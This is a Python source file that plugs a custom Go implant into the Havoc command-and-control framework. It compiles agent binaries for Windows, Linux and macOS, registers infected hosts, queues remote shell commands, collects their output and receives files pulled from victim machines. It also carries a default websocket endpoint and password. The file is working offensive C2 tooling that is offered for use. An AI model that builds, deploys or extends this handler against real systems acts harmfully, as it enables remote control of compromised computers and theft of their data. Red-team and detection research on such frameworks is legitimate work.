import hashlib
import logging
import shutil
import subprocess
from base64 import b64decode
import argparse
from module import *
import os

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

COMMAND_REGISTER = 0x100
COMMAND_GET_JOB = 0x101
COMMAND_NO_JOB = 0x102


# =======================
# ===== Agent Class =====
# =======================
class Golang(AgentType):
    Name = "Havoc-Agent"
    Author = "@Rvn0xsy"
    Version = "0.1"
    Description = f"""golang 3rd party agent for Havoc"""
    MagicValue = 0x41414141
    SourceCodeDir = "agent"
    ConfigFile = "agent/options.go"
    AgentName = "Havoc-Agent-Handler"

    Arch = [
        "386",
        "amd64_v1",
        "arm64"
    ]

    Formats = [
        {
            "Name": "windows",
            "Extension": "exe",
        },
        {
            "Name": "linux",
            "Extension": "",
        },
        {
            "Name": "darwin",
            "Extension": "",
        },
    ]

    BuildingConfig = {
        "Sleep": "10"
    }

    Commands = [
        CommandShell(),
        CommandExit(),
        CommandDownload(),
        CommandShellScript(),
    ]

    def write_tmp_file(self, filename, data):
        md5_hash = hashlib.md5()
        # 更新哈希对象的内容
        md5_hash.update(filename.encode('utf-8'))
        # 获取计算得到的 MD5 值
        filename_md5 = md5_hash.hexdigest()
        filepath = "/tmp/" + filename_md5
        with open(filepath, "wb") as f:
            f.write(b64decode(data))
        return filepath

    def generate(self, config: dict) -> None:

        logging.info(f"[*] config: {config}")

        self.builder_send_message(config['ClientID'], "Info", f"hello from service builder")
        self.builder_send_message(config['ClientID'], "Info", f"Options Config: {config['Options']}")
        self.builder_send_message(config['ClientID'], "Info", f"Agent Config: {config['Config']}")
        # 复制目录
        random_dir = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        dest_dir = os.path.join("/tmp", random_dir)
        shutil.copytree(self.SourceCodeDir, dest_dir)
        logging.info(f"[*] Successfully copied '{self.SourceCodeDir}' to '{dest_dir}'")
        with open(dest_dir + '/options.go', "r") as replacer:
            content = replacer.read()
        modified_content = content.replace('OPTIONS_STRING', json.dumps(config['Options']))
        with open(dest_dir + '/options.go', 'w') as file:
            file.write(modified_content)
        arch = config['Options']['Arch']
        os_type = config['Options']['Format']
        goreleaser_build_command = ["goreleaser", "build", "--snapshot", "--rm-dist", "--single-target"]
        env_variables = os.environ
        env_variables['GOOS'] = os_type
        env_variables['GOARCH'] = arch.replace('_v1', '')
        process = subprocess.Popen(goreleaser_build_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=dest_dir, env=env_variables)
        stdout, stderr = process.communicate()
        self.builder_send_message(config['ClientID'], "Info", "Standard Output:")
        self.builder_send_message(config['ClientID'], "Info", stdout.decode())
        self.builder_send_message(config['ClientID'], "Info", "Standard Error:")
        self.builder_send_message(config['ClientID'], "Info", stderr.decode())

        extension = ".exe" if os_type == "windows" else ""
        # Havoc-Agent-Handler_darwin_amd64
        # agent/dist/Havoc-Agent-Handler_windows_amd64.exe
        # agent/dist/Havoc-Agent-Handler_windows_amd64/Havoc-Agent-Handler_windows_amd64.exe
        folder = f"dist/{self.AgentName}_{os_type}_{arch}"
        filename = f"{dest_dir}/{folder}/{self.AgentName}{extension}"
        logging.info(f"[*] filename: {filename}")
        with open(filename, "rb") as f:
            data = f.read()
        self.builder_send_payload(config['ClientID'], self.AgentName + extension,
                                  data)
        shutil.rmtree(dest_dir)

    def response(self, response: dict) -> bytes:
        logging.info("Received request from agent")
        agent_header = response["AgentHeader"]
        # the team server base64 encodes the request.
        agent_response = b64decode(response["Response"])
        agent_json = json.loads(agent_response)
        if agent_json["task"] == "register":
            logging.info("[*] Registered agent")
            self.register(agent_header, json.loads(agent_json["data"]))
            AgentID = response["AgentHeader"]["AgentID"]
            self.console_message(AgentID, "Good", f"Python agent {AgentID} registered", "")
            return b'registered'
        elif agent_json["task"] == "base64":
            AgentID = response["Agent"]["NameID"]
            logging.info("[*] Agent get base64 data")
            if len(agent_json["data"]) > 0:
                print("Output: " + agent_json["data"])
                data = base64.b64decode(agent_json["data"]).decode('utf-8')
                self.console_message(AgentID, "Good", "Received Output:", data)
            return b'get_data'
        elif agent_json["task"] == "get_task":
            AgentID = response["Agent"]["NameID"]
            # self.console_message( AgentID, "Good", "Host checkin", "" )
            logging.info("[*] Agent requested taskings")
            Tasks = self.get_task_queue(response["Agent"])
            logging.info("Tasks retrieved")
            return Tasks
        elif agent_json['task'] == "post_task":
            AgentID = response["Agent"]["NameID"]
            if len(agent_json["data"]) > 0:
                logging.info("Output: " + agent_json["data"])
                self.console_message(AgentID, "Good", "Received Output:", agent_json["data"])
        elif agent_json['task'] == "download_file":
            AgentID = response["Agent"]["NameID"]
            if len(agent_json["data"]) > 0:
                filename = agent_json["external"]
                filepath = self.write_tmp_file(filename, agent_json["data"])
                logging.info("File downloaded")
                self.console_message(AgentID, "Good", "Download: ", filename+" ==> "+filepath)
        return b'ok'


def main():
    parser = argparse.ArgumentParser(description='Havoc Agent Handler')
    parser.add_argument('-e', '--endpoint', help='Websocket endpoint', default='wss://192.168.216.1:40056/service-endpoint')
    parser.add_argument('-p', '--password', help='Service password', default='service-password')
    args = parser.parse_args()
    Havoc_python = Golang()
    logging.info("[*] Connect to Havoc service api")
    havoc_service = HavocService(
        endpoint=args.endpoint,
        password=args.password
    )

    logging.info("[*] Register python to Havoc")
    havoc_service.register_agent(Havoc_python)

    return


if __name__ == '__main__':

    main()
